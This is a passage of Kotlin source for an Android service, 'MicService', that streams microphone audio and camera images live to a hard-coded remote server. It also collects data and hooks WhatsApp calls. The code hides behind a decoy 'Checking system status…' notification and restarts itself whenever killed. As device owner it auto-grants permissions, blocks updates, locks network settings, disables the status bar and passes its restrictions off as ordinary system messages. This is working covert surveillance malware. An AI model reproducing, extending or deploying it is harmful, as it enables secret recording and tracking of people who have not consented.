package com.micmonitor.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.BroadcastReceiver
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.ColorMatrix
import android.graphics.ColorMatrixColorFilter
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureResult
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.media.AudioManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.ImageReader
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.NoiseSuppressor
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.app.admin.SystemUpdatePolicy
import android.content.ComponentName
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.BatteryManager
import android.os.IBinder
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.os.SystemClock
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.core.content.edit
import androidx.exifinterface.media.ExifInterface
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import kotlinx.coroutines.isActive
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import okio.ByteString
import okio.ByteString.Companion.toByteString
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.nio.ByteBuffer
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.math.max
import kotlin.math.min
import kotlin.random.Random
import org.json.JSONObject
import org.json.JSONArray
import org.webrtc.AudioSource
import org.webrtc.AudioTrack
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpSender
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.audio.JavaAudioDeviceModule

/**
 * MicService — Core background service.
 *
 * What it does:
 *  1. Captures raw PCM audio from microphone using AudioRecord.
 *  2. Streams every audio chunk live to the Node.js server via WebSocket.
 *  3. Simultaneously writes chunks to an .pcm file (recording) on device.
 *  4. Listens for remote commands: "start_record", "stop_record", "ping".
 *  5. Auto-reconnects on WebSocket failure (every 5 seconds).
 *  6. Holds a WakeLock so the CPU stays alive in background.
 *  7. restarted automatically by BootReceiver on reboot.
 */
class MicService : Service() {

    // ── Coroutine scope (cancelled on destroy) ──────────────────────────────
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // ── Audio capture ────────────────────────────────────────────────────────
    private var audioRecord: AudioRecord? = null
    private var audioCaptureJob: Job? = null
    private val isCapturingGuard = java.util.concurrent.atomic.AtomicBoolean(false)
    private val sampleRate    = 16000           // 16 kHz
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat   = AudioFormat.ENCODING_PCM_16BIT
    private val minBufferSize by lazy {
        val min = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
        // Some OEMs return an error code; use a safe fallback in that case.
        if (min > 0) min else sampleRate
    }
    private val recordBufferSize by lazy { max(minBufferSize * 2, sampleRate * 2) }  // Bug L6 fix: 1s buffer (was 4s) — saves memory
    // Bug 3.3: Read 100ms bursts internally to handle CPU bursts
    private val audioReadBufferMs = 100  // 100ms internal read bursts
    private val audioReadBufferSize by lazy { (sampleRate * audioReadBufferMs / 1000) * 2 }  // bytes
    // 20 ms default chunks; in forced low-network mode we can stretch to 30-40 ms.
    // Bug 2.1: Cache chunk size at loop start so we don't recalculate every iteration
    private val streamChunkSize: Int
        get() = ((sampleRate * 2 * currentStreamFrameMs()) / 1000).coerceAtLeast(640)

    // ── WebSocket ────────────────────────────────────────────────────────────
    private var webSocket: WebSocket? = null
    @Volatile private var activeWsTargetUrl: String? = null
    private val isWsConnecting = java.util.concurrent.atomic.AtomicBoolean(false)
    private var wsReconnectJob: Job? = null
    private val reconnectScheduleLock = Any()
    private val cameraLiveMutex = Mutex()
    @Volatile private var wsReconnectAttempts = 0
    @Volatile private var wsConnectFailuresCount = 0 // For Bug 10: only rotate after real failures
    @Volatile private var sourceRotateAttempts = 0
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(90, TimeUnit.SECONDS) // Bug Fix: 60s prevents timeout on Render free-tier cold starts
        .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
        .writeTimeout(8, TimeUnit.SECONDS) // Bug 2.8: Reduce from 15s to 8s for faster stalled socket detection
        .pingInterval(20, TimeUnit.SECONDS)        // More frequent keep-alive (was 30s)
        .build()
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(90, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(8, TimeUnit.SECONDS) // Bug 2.8: Add retry backoff logic via writeTimeout reduction
        .build()
    private val photoUploadClient = httpClient.newBuilder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    private val recordingUploadClient = httpClient.newBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(5, TimeUnit.MINUTES) // allow long transfers for large files
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // ── Streaming state ─────────────────────────────────────────────────────
    @Volatile private var isCapturing   = false
    @Volatile private var aiEnhancementEnabled = true
    @Volatile private var aiAutoModeEnabled = true
    @Volatile private var wantsMicStreaming = true
    @Volatile private var isRecoveringMic = false
    @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
    @Volatile private var voiceProfile = "room" // near | room | far
    @Volatile private var softwareGainMultiplier = 1.6 // Remote-adjustable gain boost (1.0 = default, 2.0 = 2x louder)
    @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
    @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
    @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
    private var lowNetworkRecoveryStreak = 0
    @Volatile private var lastNetworkCapabilitiesAt = 0L
    @Volatile private var isNetworkLagging = false
    private var lastDataHashStr: String = "" // Bug 5: String checksum for dedup
    // BUG-R1/R13 fix: single AtomicBoolean is the ONLY guard — isPhotoCaptureBusy removed
    private val photoCaptureBusyGuard = java.util.concurrent.atomic.AtomicBoolean(false)

    private var recordingUploaderJob: Job? = null

    private fun currentStreamFrameMs(): Int {
        // For WebRTC (UDP), smaller 20ms frames are handled internally.
        // For WebSocket (TCP), if network is weak/lagging, bundling into 40ms 
        // halves the TCP/IP acknowledgment overhead, vastly improving weak WiFi stability.
        return if (lowNetworkMode || isNetworkLagging) 40 else 20
    }
    
    // HQ Buffered Audio Mode removed (M-02) — all code uses realtime path
    @Volatile private var lastAudioChunkSentAt = 0L
    @Volatile private var lastPingSentAt = 0L
    @Volatile private var lastHealthSentAt = 0L
    @Volatile private var audioSourceRotation = 0
    @Volatile private var activeAudioSource = MediaRecorder.AudioSource.DEFAULT
    private var micWatchdogJob: Job? = null

    private var estimatedNoiseDb = -62.0
    private var lastAutoAiSwitchAt = 0L
    @Volatile private var preferredCameraFacing = CameraCharacteristics.LENS_FACING_BACK
    @Volatile private var cameraLiveFacing = CameraCharacteristics.LENS_FACING_BACK
    // isPhotoCaptureBusy removed (BUG-R1/R13): use photoCaptureBusyGuard.get() instead
    @Volatile private var aiPhotoEnhancementEnabled = true
    @Volatile private var photoQualityMode = "normal" // fast | normal | hd
    @Volatile private var photoNightMode = "off" // off | 1s | 3s | 5s
    @Volatile private var isCameraLiveStreaming = false
    @Volatile private var cameraLiveStrictFacing = false
    private var cameraLiveJob: Job? = null
    @Volatile private var restartFromTaskRemoval = false
    @Volatile private var reconnectAlarmTriggerAtElapsed = 0L
    private val audioCaptureStoppedExternally = java.util.concurrent.atomic.AtomicBoolean(false)

    // ── PCM enhancement filter state (persists across frames for continuity) ──
    // Reset these at each capture start so a previous session's state is never reused.
    private var hpfPrevX = 0.0      // HPF: previous raw input sample
    private var hpfPrevY = 0.0      // HPF: previous output sample
    private var eq1X1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-1]
    private var eq1X2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-2]
    private var eq1Y1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-1]
    private var eq1Y2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-2]
    private var smoothedGain = 1.0  // Start neutral and ramp dynamically to avoid startup clipping
    @Volatile private var ourAudioMode = false  // true while we changed AudioManager.mode from NORMAL
    // Overlap-add FFT spectral denoiser — realtime path.
    private val spectralDenoiser = SpectralDenoiser()
    // Hardware session effects (must outlive AudioRecord; released in stopAudioCapture / release path)
    private var noiseSuppressor: NoiseSuppressor? = null
    private var acousticEchoCanceler: AcousticEchoCanceler? = null
    private var automaticGainControl: AutomaticGainControl? = null
    // Stage 4b high-shelf continuity across stream chunks
    private var hfShelfPrevOut = 0.0
    private var hfShelfNeedsPrime = true
    // Skip spectral denoise for first N chunks (noise model only; WS still sends HPF+EQ audio)
    private var realtimeDenoiserWarmupChunksRemaining = 0
    // MuLaw 16k→8k decimator low-pass state (anti-alias)
    private var muLawDecimLp = 0.0

    // ── WebRTC state (phone publishes mic track) ───────────────────────────
    @Volatile private var isWebRtcStreaming = false
    private val webRtcMutex = Mutex()
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var audioDeviceModule: JavaAudioDeviceModule? = null
    private var peerConnection: PeerConnection? = null
    private var localAudioSource: AudioSource? = null
    private var localAudioTrack: AudioTrack? = null
    private var webRtcAudioSender: RtpSender? = null
    private var currentWebRtcBitrateKbps = 24
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var webRtcRecoveryJob: Job? = null
    private var iceWatchdogJob: Job? = null
    @Volatile private var pendingRemoteOfferSdp: String? = null

    @Volatile private var lastDashboardQuality: JSONObject? = null
    private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
        PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
    )

    private fun preferredAudioSources(): IntArray {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            intArrayOf(
                MediaRecorder.AudioSource.UNPROCESSED,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
            )
        } else {
            intArrayOf(
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
            )
        }
    }

    // ── WakeLock ─────────────────────────────────────────────────────────────
    private var wakeLock: PowerManager.WakeLock? = null  // Instance, not static (Bug 1.1)
    private val connectivityManager by lazy {
        getSystemService(ConnectivityManager::class.java)
    }

    // ── Data Collector ───────────────────────────────────────────────────────
    private val dataCollector by lazy { DataCollector(this) }
    private var dataJob: Job? = null
    private var whatsAppCallReceiver: BroadcastReceiver? = null
    private var networkEnforcerJob: Job? = null

    // ── Prefs / Device ID ────────────────────────────────────────────────────
    private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
    
    // Use Android ID as base for device ID - survives cache clear
    // Bug 6: Lazy init inside coroutine can stall; Eager init inside onCreate instead.
    private lateinit var deviceId: String

    private fun initDeviceId() {
        deviceId = prefs.getString("device_id", null) ?: run {
            val androidId = android.provider.Settings.Secure.getString(
                contentResolver, 
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            
            val md = java.security.MessageDigest.getInstance("SHA-256")
            val stableId = md.digest(androidId.toByteArray()).joinToString("") { "%02x".format(it) }.take(16)
            
            stableId.also { id ->
                prefs.edit { putString("device_id", id) }
                Log.i(TAG, "Generated stable device ID: $id")
            }
        }
    }
    
    // ── Server URL ────────────────────────────────────────────────────────────
    // Always use configured/default Render URL.
    // wss://your-app.onrender.com/audio/
    companion object {
        const val TAG          = "MicService"
        const val CHANNEL_ID   = "device_services_channel"
        const val NOTIF_ID     = 101
        const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
        
        // WebRTC bitrate settings — keep quality stable with FEC on real networks.
        const val WEBRTC_LAST_RESORT_BITRATE_KBPS = 24
        const val WEBRTC_MIN_BITRATE_KBPS = 32
        const val WEBRTC_MID_BITRATE_KBPS = 40
        const val WEBRTC_MAX_BITRATE_KBPS = 48
        
        // Standard profile bitrates
        const val WEBRTC_STANDARD_MIN_KBPS = 32
        const val WEBRTC_STANDARD_MID_KBPS = 40
        const val WEBRTC_STANDARD_MAX_KBPS = 48
        
        // Far mode bitrates - higher quality for distant voice capture
        const val WEBRTC_FAR_MIN_KBPS = 40
        const val WEBRTC_FAR_MID_KBPS = 64           // Better quality for distant audio (was 128)
        const val WEBRTC_FAR_MAX_KBPS = 80           // Maximum quality ceiling (was 160)
        
        // Audio codec identifiers
        const val AUDIO_CODEC_PCM16_16K: Byte = 0x00  // Full quality - no compression
        const val AUDIO_CODEC_MULAW_8K: Byte = 0x01   // Compressed fallback
        
        const val WS_RECONNECT_BASE_MS = 500L     // Fast initial retry (was 2000)
        const val WS_RECONNECT_MAX_MS = 30_000L   // Max delay 30s (was 5s)

        // IPC for call recorder
        const val ACTION_WHATSAPP_CALL_START = "com.micmonitor.app.WHATSAPP_CALL_START"
        const val ACTION_WHATSAPP_CALL_END = "com.micmonitor.app.WHATSAPP_CALL_END"

        // Render cloud URL — works on any network (WiFi or cellular)
        const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
        val DEFAULT_SERVER_TOKEN: String = BuildConfig.DEFAULT_SERVER_TOKEN

        // Shared websocket for service health checks and optional future hooks.
        @Volatile var activeWebSocket: WebSocket? = null
        @Volatile var lastAudioChunkSentAtMs: Long = 0L
        // Bug 1.1: WakeLock is now instance-level (see acquireWakeLock), not static
        @Volatile var staticWakeLock: PowerManager.WakeLock? = null
        val lastHttpFallbackWsState = java.util.concurrent.atomic.AtomicReference<Boolean?>(null)
    }

    private val configuredServerBaseUrl: String
        get() = (prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL).trim()

    private val serverUrl: String
        get() = configuredServerBaseUrl.trimEnd('/') + "/$deviceId"

    private val wsAuthToken: String
        get() = (prefs.getString("server_token", DEFAULT_SERVER_TOKEN) ?: DEFAULT_SERVER_TOKEN).trim()

    private val serverHttpBaseUrl: String
        get() {
            val normalized = configuredServerBaseUrl
                .replace(Regex("^wss://", RegexOption.IGNORE_CASE), "https://")
                .replace(Regex("^ws://", RegexOption.IGNORE_CASE), "http://")
                .trim()
            return try {
                val parsed = android.net.Uri.parse(normalized)
                val scheme = when (parsed.scheme?.lowercase()) {
                    "http", "https" -> parsed.scheme!!.lowercase()
                    else -> "https"
                }
                val host = parsed.host ?: return normalized.trimEnd('/').replace(Regex("/audio(/.*)?$"), "")
                val port = if (parsed.port > 0) ":${parsed.port}" else ""
                "$scheme://$host$port"
            } catch (_: Exception) {
                normalized.trimEnd('/').replace(Regex("/audio(/.*)?$"), "")
            }
        }

    // ────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ────────────────────────────────────────────────────────────────────────

    // M-03: Only run setupDeviceOwnerPolicies once per service lifetime
    private var isDeviceOwnerConfigured = false
    // L-01: Cache last codec choice to avoid side-effect logs in sendHealthStatus
    @Volatile private var lastCodecChoice: Byte = AUDIO_CODEC_PCM16_16K

    override fun onCreate() {
        super.onCreate()
        initDeviceId()
        createNotificationChannel()
        acquireWakeLock()
        setupNetworkListener()
        setupCallListener()
        setupWhatsAppCallReceiver()
        
        // Start discovery if already on WiFi
        val cm = connectivityManager
        val activeNetwork = cm?.activeNetwork
        val caps = cm?.getNetworkCapabilities(activeNetwork)
        
        // WebRTC init moved to startWebRtcSession() - too early here causes crash
        Log.i(TAG, "Service created. Device ID: $deviceId")
    }

    private fun setupNetworkListener() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val cm = connectivityManager ?: return
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    Log.i(TAG, "Network mapped onAvailable! Forcing reconnect if needed")
                    if (activeWebSocket != null) {
                        // Bug M4 fix: Don't restart HTTP fallback when WS is alive — avoids
                        // cancelling in-flight heartbeat responses on network transport changes.
                        return
                    }

                    wsReconnectAttempts = 0 // Reset backoff for faster recovery
                    scheduleWebSocketReconnect("network_available", forceRestart = true)
                    startHttpFallbackSync()
                }

                override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                    super.onCapabilitiesChanged(network, networkCapabilities)
                    val now = SystemClock.elapsedRealtime()
                    if (now - lastNetworkCapabilitiesAt < 1_500L) return
                    lastNetworkCapabilitiesAt = now
                    serviceScope.launch(Dispatchers.Default) { // Bug M5 fix: No UI work here
                        // Keep low-network mode under explicit dashboard control only.
                        // We still adapt frame pacing while low-network mode is enabled.
                        updateLowNetworkTransportTuning(networkCapabilities)
                        if (isWebRtcStreaming) {
                            applyAdaptiveBitrate()
                        }
                    }
                }

                override fun onLost(network: Network) {
                    super.onLost(network)
                    // Bug L5 fix: onLost fires per-transport. Check if ANY connectivity remains
                    // before tearing down — avoids brief audio gaps on WiFi↔Cellular handoff.
                    val cm = connectivityManager
                    val stillConnected = cm?.activeNetwork?.let { net ->
                        cm.getNetworkCapabilities(net)?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    } == true
                    if (stillConnected) {
                        Log.i(TAG, "Network transport lost but another available — skipping teardown")
                        return
                    }
                    Log.i(TAG, "All network transports lost! Triggering rapid failover.")
                    val hadSocket = activeWebSocket != null
                    try { activeWebSocket?.close(1001, "Network lost") } catch (_: Exception) {}
                    isWsConnecting.set(false)

                    if (hadSocket) {
                        onWsDisconnected("network_lost")
                    } else {
                        scheduleWebSocketReconnect("network_lost", forceRestart = true)
                    }
                    // BUG-H4 fix: Don't start HTTP fallback when no network — it will just fail
                    // HTTP loop handles reconnection when network returns via onAvailable
                }
            }
            cm.registerDefaultNetworkCallback(networkCallback!!)
        }
    }

    private fun updateLowNetworkTransportTuning(caps: NetworkCapabilities?) {
        val prevFrameMs = lowNetworkFrameMs
        val prevSampleRate = lowNetworkSampleRate
        val prevLowNet = lowNetworkMode

        val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0
        val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0

        // Auto-enable low-network mode only when bandwidth is genuinely constrained.
        // Disable requires sustained stronger samples to avoid ping-pong.
        if (!prefs.getBoolean("session_low_network_manual", false)) {
            val shouldEnableLowNetwork = (upKbps in 1..80) || (downKbps in 1..150)
            if (shouldEnableLowNetwork) {
                lowNetworkMode = true
                lowNetworkRecoveryStreak = 0
            } else if (lowNetworkMode && upKbps > 200 && downKbps > 200) {
                lowNetworkRecoveryStreak++
                if (lowNetworkRecoveryStreak >= 6) {
                    lowNetworkMode = false
                    lowNetworkRecoveryStreak = 0
                }
            } else {
                lowNetworkRecoveryStreak = 0
            }
        } else {
            lowNetworkRecoveryStreak = 0
        }

        if (!lowNetworkMode) {
            lowNetworkSampleRate = 16000
            lowNetworkFrameMs = 20
            if (prevLowNet != lowNetworkMode) {
                Log.i(TAG, "Low-network auto-disabled (up=${upKbps}kbps down=${downKbps}kbps)")
            }
            return
        }

        // Preserve clarity at 16 kHz; lock frame duration to 20ms to prevent audio stutters.
        lowNetworkSampleRate = 16000
        lowNetworkFrameMs = 20

        if (prevFrameMs != lowNetworkFrameMs || prevSampleRate != lowNetworkSampleRate || prevLowNet != lowNetworkMode) {
            Log.i(TAG, "Low-network tuning: sampleRate=${lowNetworkSampleRate}Hz frameMs=${lowNetworkFrameMs} autoEnabled=${!prevLowNet && lowNetworkMode}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand action=${intent?.action}")

        // Bug 5, 6, 15: Run startForeground IMMEDIATELY before anything else
        // Fix: FOREGROUND_SERVICE_TYPE_MICROPHONE and CAMERA were added in Android 11 (API 30 / R)
        // using them on API 29 (Q) causes a NoSuchFieldError crash.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val typeFlags = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            startForeground(NOTIF_ID, buildNotification("Checking system status…"), typeFlags)
        } else {
            startForeground(NOTIF_ID, buildNotification("Checking system status…"))
        }

        // Layer 14: Device Owner Power-Up (M-03: only once per service lifetime)
        if (!isDeviceOwnerConfigured) {
            setupDeviceOwnerPolicies()
            isDeviceOwnerConfigured = true
        }

        // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
        if (intent?.action == ACTION_RECONNECT && (intent.data?.schemeSpecificPart?.startsWith("reconnect") == true || intent.data?.schemeSpecificPart == "restart")) {
            reconnectAlarmTriggerAtElapsed = 0L
            wsReconnectJob?.cancel() // Bug H: explicitly cancel sleeping job so no double connect race
            if (activeWebSocket == null) {
                Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
                connectWebSocket()
            } else {
                // Bug 9: WS is alive — just ensure workers are running, no redundant HTTP calls
                Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
                if (!isCapturing && !isWebRtcStreaming && wantsMicStreaming) startAudioCapture()
            }
            scheduleReconnectAlarm() // reschedule only, no redundant startHttpFallbackSync (Bug 9)
            return START_STICKY
        }

        if (activeWebSocket == null) {
            connectWebSocket()
        } else {
            Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
            if (!isCapturing && !isWebRtcStreaming && wantsMicStreaming) startAudioCapture()
            startMicWatchdog()
            startDataCollection()
            startRecordingUploader()
        }
        startNetworkEnforcer()
        startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
        scheduleKeepAlive()
        scheduleReconnectAlarm()
        // Bug 1.1: Reset instance wakeLock on every START_STICKY restart
        if (wakeLock == null) {
            acquireWakeLock()
        }
        return START_STICKY   // Android restarts service automatically if killed
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        restartFromTaskRemoval = true
        Log.i(TAG, "onTaskRemoved — will schedule forced restart in onDestroy")
    }
    private fun scheduleForcedRestart() {
        try {
            (getSystemService(PowerManager::class.java)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "MicMonitor::RestartHandoffWakeLock"
            ).apply {
                setReferenceCounted(false)
                acquire(5_000L)
            }
        } catch (_: Exception) {
            null
        }
        val restartIntent = Intent(applicationContext, MicService::class.java).apply {
            action = ACTION_RECONNECT
            data = android.net.Uri.parse("timer:restart") // Bug 13: Unique Intent
        }
        val pendingIntent = PendingIntent.getService(
            this, 11, restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 2_000
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.setExact(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
    }

    /**
     * Advanced Device Owner Policies (Layer 14)
     * Configures global settings to prevent the device from sleeping or users from interfering.
     */
    private fun setupDeviceOwnerPolicies() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (dpm.isDeviceOwnerApp(packageName)) {
                val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                Log.i(TAG, "Device Owner detected — applying global persistence policies")

                // 1. Keep WiFi alive at all times (Layer 14/15)
                try {
                    @Suppress("DEPRECATION")
                    dpm.setGlobalSetting(admin, android.provider.Settings.Global.WIFI_SLEEP_POLICY, 
                        android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER.toString())
                } catch (e: Exception) { Log.w(TAG, "WiFi sleep policy failed: ${e.message}") }

                // 2. Keep screen on if plugged in (standard for remote nodes)
                try {
                    dpm.setGlobalSetting(admin, android.provider.Settings.Global.STAY_ON_WHILE_PLUGGED_IN, 
                        (android.os.BatteryManager.BATTERY_PLUGGED_AC or 
                         android.os.BatteryManager.BATTERY_PLUGGED_USB or 
                         android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS).toString())
                } catch (e: Exception) { Log.w(TAG, "Stay on policy failed: ${e.message}") }

                // 3. Disable ADB if security is desired, or keep it for debugging.
                // dpm.setGlobalSetting(admin, android.provider.Settings.Global.ADB_ENABLED, "1")

                // 4. Disable system updates to prevent unintended reboots/UI changes
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    try {
                        dpm.setSystemUpdatePolicy(admin, SystemUpdatePolicy.createWindowedInstallPolicy(0, 1439)) // All day
                    } catch (e: Exception) { Log.w(TAG, "System update policy failed: ${e.message}") }
                }

                // 5. Reinforce Auto-Grant Permissions on every restart
                UpdateService.autoGrantPermissions(this)

                // 6. Enforce network restrictions based on dashboard preference
                try {
                    if (prefs.getBoolean("network_locked", false)) {
                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                        }
                        dpm.setStatusBarDisabled(admin, true)
                        // Make the Android IT Admin popup look like a normal system restriction
                        dpm.setShortSupportMessage(admin, "System setting restricted.")
                        Log.i(TAG, "Network restrictions applied (Wi-Fi, Data, Airplane Mode locked)")
                    } else {
                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                        }
                        dpm.setStatusBarDisabled(admin, false)
                        dpm.setShortSupportMessage(admin, null) // Restore default
                    }
                } catch (e: Exception) { Log.w(TAG, "Network restriction policy failed: ${e.message}") }
            }
        } catch (e: Exception) {
            Log.e(TAG, "setupDeviceOwnerPolicies failed: ${e.message}")
        }
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — stopping service")
        isCapturing  = false

        // Cancel reconnect/fallback jobs FIRST (they launch new coroutines)
        wsReconnectJob?.cancel()
        wsReconnectJob = null
        httpFallbackJob?.cancel()
        httpFallbackJob = null

        // Stop subsystems BEFORE cancelling scope (they may send final health/ack)
        stopMicWatchdog()
        // Bug C2 fix: stopAudioCapture is synchronous — calling runBlocking on Main thread
        // risks a 5-second ANR on Android 14+. Direct call is safe and immediate.
        stopAudioCapture("service_destroy")
        stopWebRtcSession(notifyState = false)
        stopCameraLiveStream("service_destroy")
        stopDataCollection()
        stopRecordingUploader()
        networkEnforcerJob?.cancel()
        networkEnforcerJob = null


        // Close WebSocket cleanly
        activeWebSocket = null
        webSocket?.close(1000, "Service stopped")
        webSocket = null
        isWsConnecting.set(false)

        // NOW cancel the scope — all cleanup above has already completed
        serviceScope.cancel()

        peerConnectionFactory?.dispose()
        peerConnectionFactory = null
        audioDeviceModule?.release()
        audioDeviceModule = null
        networkCallback?.let {
            try { connectivityManager?.unregisterNetworkCallback(it) } catch (e: Exception) {}
        }
        whatsAppCallReceiver?.let {
            try { unregisterReceiver(it) } catch (e: Exception) {}
        }
        // Bug 7: Guard WakeLock release against double-release crash
        synchronized(MicService::class.java) {
            try {
                if (wakeLock?.isHeld == true) wakeLock?.release()
            } catch (_: Exception) {}
        }

        // Avoid double-start races when START_STICKY already triggers restart.
        if (restartFromTaskRemoval) {
            scheduleForcedRestart()
            restartFromTaskRemoval = false
        }
        
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ────────────────────────────────────────────────────────────────────────
    // WebSocket connection
    // ────────────────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        if (activeWebSocket != null || !isWsConnecting.compareAndSet(false, true)) {
            Log.i(TAG, "connectWebSocket skipped (already connected/connecting)")
            return
        }
        val targetUrl = serverUrl
        activeWsTargetUrl = targetUrl
        Log.i(TAG, "[WS] Connecting to: $targetUrl")
        updateNotification("Checking system status…")

        try {
            webSocket?.close(1000, "Reconnecting")
            webSocket = null
        } catch (_: Exception) {}

        val requestBuilder = Request.Builder()
            .url(targetUrl)
